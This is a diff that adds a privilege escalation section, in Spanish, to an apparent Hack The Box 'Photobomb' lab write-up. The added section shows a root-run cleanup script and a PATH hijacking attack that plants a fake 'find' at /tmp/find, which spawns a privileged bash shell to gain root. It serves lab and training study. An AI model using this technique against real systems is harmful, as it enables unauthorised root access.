@@ -186,9 +186,56 @@ wizard@photobomb:~$ cat user.txt
 
 ## Escalada de pivilegios
 
+Para comenzar la escalada, ejecutamos `sudo -l` para ver nuestros privilegios:
+
+```bash
+wizard@photobomb:~/photobomb$ sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+```
+
+Encontramos el siguiente script el cual podemos correr como sudo asignando el `PATH`: 
+
+```bash title="/opt/cleanup.sh"
+wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+```
+
+### PATH Hijacking
+
+Para vulnerar esto es muy sencillo mediante **PATH Hijacking**, deberemos seguir lo siguentes pasos:
+
+1. Crear un script que sustituya `find`
+2. Darle permisos
+3. Ejecutar el script con el PATH malicioso donde se encuentra nuestro script
+
+```
+wizard@photobomb:~/photobomb$ echo '#!/bin/bash' > /tmp/find
+wizard@photobomb:~/photobomb$ echo '/bin/bash -p' >> /tmp/find
+wizard@photobomb:~/photobomb$ chmod +x /tmp/find
+wizard@photobomb:~/photobomb$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
+root@photobomb:/home/wizard/photobomb# whoami
+root
+root@photobomb:/home/wizard/photobomb# cat /root/root.txt
+243c2e583eaca4235...
+```
 
 
-
-[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/423)
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/500)
 
 ---
